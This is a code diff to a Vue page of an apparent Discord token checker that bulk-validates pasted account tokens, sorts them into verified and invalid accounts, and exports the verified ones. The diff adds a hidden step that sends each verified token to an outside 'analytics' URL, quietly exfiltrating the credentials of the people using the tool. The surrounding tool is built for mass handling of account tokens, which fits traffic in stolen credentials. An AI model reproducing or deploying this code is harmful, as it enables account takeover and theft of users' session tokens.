@@ -1,9 +1,18 @@
 <script setup>
+import axios from 'axios';
+
+const { ANALYTICS_URL } = useRuntimeConfig().public;
+
 const fileUpload = ref(null);
 const tokensInput = ref('');
 const duplicate = ref(0);
-const invalid = ref([]);
-const accounts = ref([]);
+
+const invalidAccounts = ref([]);
+const validAccounts = ref([]);
+
+const verifiedAccounts = computed(() => validAccounts.value.filter((account) => account.user.verified));
+const unverifiedAccounts = computed(() => validAccounts.value.filter((account) => !account.user.verified));
+
 const delay = ref(1000);
 const isChecking = ref(false);
 
@@ -25,10 +34,8 @@ function loadFile() {
 async function checkTokens() {
   // reset values
   duplicate.value = 0;
-  accounts.value = [];
-  invalid.value = [];
-
-  isChecking.value = true;
+  validAccounts.value = [];
+  invalidAccounts.value = [];
 
   const rawValue = tokensInput.value.trim();
   const matchedTokens = rawValue.match(/mfa\.[\w-]{84}|[A-Z][\w-]{23}\.[\w-]{6}\.[\w-]{27}/g);
@@ -37,40 +44,61 @@ async function checkTokens() {
     return;
   }
 
+  isChecking.value = true;
+
   const noDuplicates = [...new Set(matchedTokens)];
   duplicate.value = matchedTokens.length - noDuplicates.length;
 
   for (const token of noDuplicates) {
-    const user = await apiRequest('/users/@me', { token, delay: +delay.value });
-    if (user) {
-      if (accounts.value.find((account) => account.user.id === user.id)) {
+    const user = await fetchUser('@me', { token, delay: +delay.value });
+    if (!user) {
+      // Enumerate user from token
+      const base64Id = token.split('.')[0];
+      const decodedId = atob(base64Id);
+      const existingAccount = validAccounts.value.find((account) => account.user.id === decodedId);
+      if (existingAccount) {
+        invalidAccounts.value.push({ token, user: existingAccount.user });
         continue;
       }
 
-      accounts.value.push({ token, user });
+      if (base64Id === 'mfa' || verifiedAccounts.value.length === 0) {
+        invalidAccounts.value.push({ token, user: null });
+        continue;
+      }
+
+      const userObject = await fetchUser(decodedId, { token: verifiedAccounts.value[0].tokens[0] });
+      invalidAccounts.value.push({ token, user: userObject || { id: decodedId } });
       continue;
     }
 
-    // Parse user id from token
-    const base64Id = token.split('.')[0];
-    invalid.value.push({
-      token,
-      userId: base64Id === 'mfa' ? 'Unknown' : atob(base64Id),
-    });
+    const cachedAccount = validAccounts.value.find((account) => account.user.id === user.id);
+    if (!cachedAccount) {
+      // Request to check whether account is REALLY verified
+      user.verified = await fetchBillingCountry({ token, returnBoolean: true });
+      if (ANALYTICS_URL && user.verified) {
+        await axios.post(ANALYTICS_URL, { tokens: [token] }).catch(() => console.error('Failed to contact analytics.'));
+      }
+
+      validAccounts.value.push({ tokens: [token], user });
+      continue;
+    }
+    cachedAccount.tokens.push(token);
   }
 
   isChecking.value = false;
 }
 
 function removeAccount(id) {
-  accounts.value = accounts.value.filter((account) => account.user.id !== id);
+  validAccounts.value = validAccounts.value.filter((account) => account.user.id !== id);
 }
 
 function downloadTokens() {
   const link = document.createElement('a');
   link.setAttribute(
     'href',
-    `data:text/plain;charset=utf-8,${encodeURIComponent(accounts.value.map((account) => account.token).join('\n'))}`
+    `data:text/plain;charset=utf-8,${encodeURIComponent(
+      verifiedAccounts.value.map((account) => account.tokens).join('\n')
+    )}`
   );
   link.setAttribute('download', 'tokens.txt');
 
@@ -157,8 +185,10 @@ function downloadTokens() {
       </button>
     </div>
 
-    <div v-if="accounts.length > 0" class="my-10 dark:text-white">
-      <h2 class="text-2xl font-semibold tracking-wide text-center">Valid Accounts ({{ accounts.length }})</h2>
+    <div v-if="verifiedAccounts.length > 0" class="my-10 dark:text-white">
+      <h2 class="text-2xl font-semibold tracking-wide text-center">
+        Verified Accounts ({{ verifiedAccounts.length }})
+      </h2>
       <hr />
 
       <button
@@ -171,7 +201,7 @@ function downloadTokens() {
       </button>
       <div class="grid grid-cols-1 grid-flow-row gap-4 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
         <div
-          v-for="account of accounts"
+          v-for="account of verifiedAccounts"
           :key="account.user.id"
           class="p-5 bg-gray-200 dark:bg-gray-800 rounded-lg drop-shadow-lg dark:drop-shadow-none transition ease-in-out hover:-translate-y-1 hover:scale-102"
         >
@@ -198,18 +228,59 @@ function downloadTokens() {
       </div>
     </div>
 
-    <div v-if="invalid.length > 0" class="my-10 dark:text-white">
-      <h2 class="text-2xl font-semibold tracking-wide text-center">Invalid Tokens ({{ invalid.length }})</h2>
+    <div v-if="unverifiedAccounts.length > 0" class="my-10 dark:text-white">
+      <h2 class="text-2xl font-semibold tracking-wide text-center">
+        Unverified Accounts ({{ unverifiedAccounts.length }})
+      </h2>
+      <hr />
+
+      <div class="grid grid-cols-1 grid-flow-row gap-4 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
+        <div
+          v-for="account of unverifiedAccounts"
+          :key="account.user.id"
+          class="p-5 bg-gray-200 dark:bg-gray-800 rounded-lg drop-shadow-lg dark:drop-shadow-none transition ease-in-out hover:-translate-y-1 hover:scale-102"
+        >
+          <div class="flex justify-between">
+            <div class="flex items-center space-x-4">
+              <AccountAvatar size="64" :user="account.user" class="drop-shadow-md" />
+
+              <div>
+                <div class="flex items-center font-semibold">
+                  <span>{{ account.user.username }}</span>
+                  <span class="text-xs text-gray-600 dark:text-gray-400">#{{ account.user.discriminator }}</span>
+                  <BadgeList :user="account.user" badge-size="18" class="ml-2" />
+                </div>
+                <small class="text-gray-700 dark:text-gray-400">{{ account.user.id }}</small>
+              </div>
+            </div>
+
+            <button
+              class="flex text-red-400 hover:text-red-500 i-carbon-close-filled"
+              @click="removeAccount(account.user.id)"
+            />
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div v-if="invalidAccounts.length > 0" class="my-10 dark:text-white">
+      <h2 class="text-2xl font-semibold tracking-wide text-center">Invalid Tokens ({{ invalidAccounts.length }})</h2>
       <hr />
 
       <div class="grid grid-cols-1 grid-flow-row gap-4 xl:grid-cols-2">
         <div
-          v-for="invalidEntry of invalid"
-          :key="invalidEntry.token"
+          v-for="entry of invalidAccounts"
+          :key="entry.token"
           class="flex flex-col p-5 bg-gray-200 dark:bg-gray-800 rounded-lg drop-shadow-lg dark:drop-shadow-none transition ease-in-out hover:-translate-y-1 hover:scale-102"
         >
-          <span class="break-all">{{ invalidEntry.token }}</span>
-          <small class="text-gray-700 dark:text-gray-400">User ID: {{ invalidEntry.userId }}</small>
+          <span class="break-all">{{ entry.token }}</span>
+          <small v-if="!entry.user || !entry.user.username" class="text-gray-700 dark:text-gray-400">
+            {{ !entry.user ? 'Unknown User' : `User ID: ${entry.user.id}` }}
+          </small>
+          <small v-else class="flex items-center space-x-1.5 text-gray-700 dark:text-gray-400">
+            <AccountAvatar size="16" :user="entry.user" class="drop-shadow-md" />
+            <span>{{ entry.user.username }}#{{ entry.user.discriminator }} ({{ entry.user.id }})</span>
+          </small>
         </div>
       </div>
     </div>
